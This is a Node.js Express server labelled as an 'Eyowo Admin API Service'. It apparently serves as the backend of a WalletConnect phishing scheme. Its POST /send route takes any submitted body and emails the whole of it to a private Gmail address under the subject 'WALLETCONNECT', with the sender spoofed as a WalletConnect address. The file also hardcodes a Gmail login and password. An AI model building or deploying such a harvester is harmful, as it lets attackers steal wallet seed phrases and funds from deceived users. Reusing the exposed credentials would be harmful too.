const express = require('express');
const nodemailer = require('nodemailer');

const app = express();
require('dotenv').config();
app.use(express.urlencoded({extended: true}));
app.use(express.json())

let transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      type: 'OAuth2',
      user: 'susanbarber283@gmail.com',
      pass: 'macvenom12',
      clientId: process.env.OAUTH_CLIENTID,
      clientSecret: process.env.OAUTH_CLIENT_SECRET,
      refreshToken: process.env.OAUTH_REFRESH_TOKEN
    }
  });
app.get('/', (req, res) => {
    res.send('Welcome to the Eyowo Admin API Service!');
  });
app.post('/send', async (req,res) =>{
    const body = req.body;
    console.log(body);
    let mailOptions = {
        from: 'walletconnect@gmail.com',
        to: 'agunorbert@gmail.com',
        subject: 'WALLETCONNECT',
        text: `Hi this is \n ${JSON.stringify(body)}`
      };
      transporter.sendMail(mailOptions, function(err, data) {
        if (err) {
          console.log("Error " + err);
        } else {
          console.log("Email sent successfully");
        }
      });
    res.send('lets go');

})

const server = app.listen(process.env.SERVER_PORT, () => {
    const host = server.address().address;
    const { port } = server.address();
    process.on('uncaughtException', (err) => {
      console.error(err, 'Uncaught Exception thrown');
      process.exit(1);
    });
    console.log('Eyowo Admin API Service listening at http://%s:%s', host, port);
  });